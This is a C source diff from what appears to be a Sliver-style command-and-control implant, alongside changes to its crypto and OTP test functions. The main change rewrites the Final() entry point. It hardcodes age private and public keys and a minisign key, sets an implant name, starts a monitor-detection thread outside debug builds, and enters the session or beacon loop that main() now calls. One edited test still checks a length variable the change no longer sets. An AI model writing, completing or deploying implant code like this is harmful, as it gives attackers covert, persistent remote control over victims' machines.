@@ -799,12 +799,11 @@ void test46(void) {
 	BYTE CipherText[] = { 166, 79, 199, 13, 85, 218, 251, 232, 139, 101, 168, 155, 94, 25, 228, 162, 11, 94, 32, 191, 233, 46, 57, 97, 121, 197, 154, 137, 5, 34, 76, 247, 150, 52, 58, 39, 239, 16, 60, 116, 166, 48, 14, 174, 8, 51, 158, 228, 88, 229, 61, 76, 203, 243, 127, 192, 97, 237, 232, 91, 29, 13, 168, 63, 8, 166, 180, 218, 130, 83, 246, 108, 153, 165, 8, 228, 41, 110, 24, 255, 201, 79 };
 	BYTE Key[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
 	BYTE Nonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
-	DWORD cbPlainText = 0;
-	PBYTE pPlainText = NULL;
+	PBUFFER pPlainText = NULL;
 
-	pPlainText = Chacha20Poly1305DecryptAndVerify(Key, Nonce, CipherText, _countof(CipherText), NULL, 0, &cbPlainText);
-	HexDump(pPlainText, cbPlainText);
-	FREE(pPlainText);
+	pPlainText = Chacha20Poly1305DecryptAndVerify(Key, Nonce, CipherText, _countof(CipherText), NULL, 0);
+	HexDump(pPlainText->pBuffer, pPlainText->cbBuffer);
+	FreeBuffer(pPlainText);
 }
 
 void test47(void) {
@@ -914,16 +913,16 @@ void test52(void) {
 	BYTE CipherText[] = { 186, 46, 74, 199, 245, 172, 132, 246, 179, 28, 129, 194, 96, 41, 128, 21, 103, 222, 254, 242, 234, 89, 148, 174, 81, 127, 131, 87, 214, 0, 34, 133, 214, 3, 44, 119, 121, 179, 62, 156, 37, 83, 92, 90, 221, 127, 138, 174 };
 
 	DWORD cbPlainText = 0;
-	PBYTE pPlainText = NULL;
+	PBUFFER pPlainText = NULL;
 
-	pPlainText = Chacha20Poly1305DecryptAndVerify(SessionKey, Nonce, CipherText, _countof(CipherText), NULL, 0, &cbPlainText);
+	pPlainText = Chacha20Poly1305DecryptAndVerify(SessionKey, Nonce, CipherText, _countof(CipherText), NULL, 0);
 	if (pPlainText == NULL || cbPlainText == 0) {
 		PrintFormatW(L"Chacha20Poly1305DecryptAndVerify failed.\n");
 		return;
 	}
 
 	HexDump(pPlainText, cbPlainText);
-	FREE(pPlainText);
+	FreeBuffer(pPlainText);
 }
 
 void test53(void) {
@@ -1762,6 +1761,29 @@ CLEANUP:
 	}
 }
 
+void test112(void) {
+	CHAR szSecret[] = "GQH4RBUBSOLX446N2CBCS7AYHYLBMA2A";
+	POTP_DATA pOtpData = NULL;
+	UINT64 uResult = 0;
+
+	pOtpData = OtpInit(30, 1, 8, szSecret);
+	uResult = GetOtpNow(pOtpData);
+	PrintFormatA("%d\n", uResult);
+	if (pOtpData != NULL) {
+		if (pOtpData->lpBase32Secret != NULL) {
+			FREE(pOtpData->lpBase32Secret);
+		}
+
+		FREE(pOtpData);
+	}
+}
+
+void test113(void) {
+	CHAR Buffer[100];
+	wsprintfA(Buffer, "%IX", (UINT64)test113);
+	PrintFormatA("%s\n", Buffer);
+}
+
 VOID DetectMonitorSystem(VOID)
 {
 	while (TRUE) {
@@ -1777,54 +1799,59 @@ VOID Final(VOID)
 {
 	HANDLE hThread = NULL;
 	DWORD dwThreadId = 0;
-	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
-	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	UINT64 uEncoderNonce = 6979;
-	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
-	DWORD dwPollInterval = 2;
-	DWORD dwMaxFailure = 5;
-	DWORD dwReconnectInterval = 600;
-	GLOBAL_CONFIG GlobalConfig;
+	
 #ifdef __BEACON__
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 #else
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+	CHAR szPeerPubKey[] = "age1p6yn2nngy5up5mwy9cl98k9g3v4e80j7vuca20046nr2cny6n46q0yu0dr";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1EHFACCLHSDQK02CTA7DWEA7ZH3A7S67Z4VD26YDWZW2RFSJN947SRKP6FG";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	UINT64 uEncoderNonce = 13;
+	CHAR szSliverClientName[32] = "LUCKY_BRASSIERE";
+	DWORD dwMaxFailure = 5;
+	DWORD dwReconnectInterval = 600;
+	PGLOBAL_CONFIG pGlobalConfig = NULL;
 #endif
 
+#ifndef _DEBUG
 	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DetectMonitorSystem, NULL, 0, &dwThreadId);
 	if (hThread == NULL) {
 		LOG_ERROR("CreateThread", GetLastError());
 		goto CLEANUP;
 	}
+#endif
 
-	SecureZeroMemory(&GlobalConfig, sizeof(GlobalConfig));
-	GlobalConfig.lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
-	GlobalConfig.lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
-	GlobalConfig.lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
-	GlobalConfig.lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
-	GlobalConfig.uEncoderNonce = uEncoderNonce;
-	lstrcpyA(GlobalConfig.szSliverName, szSliverClientName);
-	GlobalConfig.dwPollInterval = dwPollInterval;
-	GlobalConfig.dwMaxFailure = dwMaxFailure;
-	GlobalConfig.dwReconnectInterval = dwReconnectInterval;
-
+	pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
+	pGlobalConfig->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
+	pGlobalConfig->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
+	pGlobalConfig->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
+	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
+	pGlobalConfig->uEncoderNonce = uEncoderNonce;
+	lstrcpyA(pGlobalConfig->szSliverName, szSliverClientName);
+	pGlobalConfig->dwMaxFailure = dwMaxFailure;
+	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
+	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
 #ifdef __BEACON__
-	pBeaconClient = BeaconInit(&GlobalConfig);
+	pBeaconClient = BeaconInit(pGlobalConfig);
 	BeaconMainLoop(pBeaconClient);
 #else
-	pSessionClient = SessionInit(&GlobalConfig);
-	//SessionMain()
+	pSessionClient = SessionInit(pGlobalConfig);
+	SessionMainLoop(pSessionClient);
 #endif
 CLEANUP:
 	if (hThread != NULL) {
+#ifndef _DEBUG
+		TerminateThread(hThread, 0);
+#endif
 		CloseHandle(hThread);
 	}
 
 #ifdef __BEACON__
 	FreeBeaconClient(pBeaconClient);
 #else
+	FreeSessionClient(pSessionClient);
 #endif
 }
 
@@ -1968,6 +1995,9 @@ int main(void) {
 	//test108();
 	//test109();
 	//test110();
-	test111();
+	//test111();
+	//test112();
+	//test113();
+	Final();
 	return 0;
 }
